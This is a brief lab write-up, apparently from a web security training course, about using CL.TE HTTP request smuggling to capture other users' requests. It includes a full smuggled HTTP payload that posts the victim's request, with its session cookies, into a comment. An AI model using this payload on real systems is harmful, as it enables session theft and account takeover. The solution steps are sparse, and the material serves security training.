## Exploiting HTTP request smuggling to capture other users' requests

**Category:** request_smuggling
**Difficulty:** Unknown

### Description
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

### Solution Steps
If you encounter a timeout, this may indicate that the number of bytes you're trying to capture is greater than the total number of bytes in the subsequent request. Try reducing the
Content-Length
specified in the smuggled request prefix.

### Key Payloads
- `Content-Length`
- `comment-post`
- `comment`
- `POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=your-session-token

csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test`

### Indicators of Success
- Check for changes in application behavior
